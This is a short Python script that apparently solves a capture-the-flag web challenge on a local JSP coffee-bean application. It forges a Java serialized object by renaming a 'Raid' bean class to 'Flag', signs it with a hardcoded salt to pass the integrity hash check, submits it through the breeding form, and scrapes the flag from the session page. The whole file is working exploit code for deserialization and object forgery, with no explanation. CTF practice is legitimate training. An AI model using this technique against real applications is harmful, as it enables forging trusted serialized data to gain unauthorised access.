import hashlib
import requests
import base64


def get_flag(c):
    r = requests.get('http://localhost:8112/', cookies = {'JSESSIONID': c})
    start = r.content.index('flag{')
    end = start + r.content[start:].index('}')
    print r.content[start:end + 1]


def breed_bean(payload):
    data = {'bean-name' : 'win', 'bean-desc' : '',
            'parent1' : payload, 'parent2' : payload}
    s = requests.Session()
    r = s.get('http://localhost:8112/breed.jsp')
    c = r.cookies['JSESSIONID']
    r = s.post('http://localhost:8112/roaster.jsp', params = data)
    return c


def get_hash(bean):
    salt = 'c@ram31m4cchi@o'
    h = hashlib.sha256()
    h.update(bean + salt)
    return h.hexdigest()


if __name__ == "__main__":

    raid = "rO0ABXNyAA9jb2ZmZWUuUmFpZEJlYW4AAAAAAAAAAQIAAHhyAAtjb2ZmZWUuQmVhbg\
            AAAAAAAAABAgAETAAHaW5oZXJpdHQADUxjb2ZmZWUvQmVhbjtMAARuYW1ldAASTGph\
            dmEvbGFuZy9TdHJpbmc7TAAHcGFyZW50MXEAfgACTAAHcGFyZW50MnEAfgACeHBwdA\
            AEUmFpZHBw"

    patched = base64.b64encode(base64.b64decode(raid).replace('Raid', 'Flag'))
    payload = patched + '-' + get_hash(patched)
    c = breed_bean(payload)
    get_flag(c)
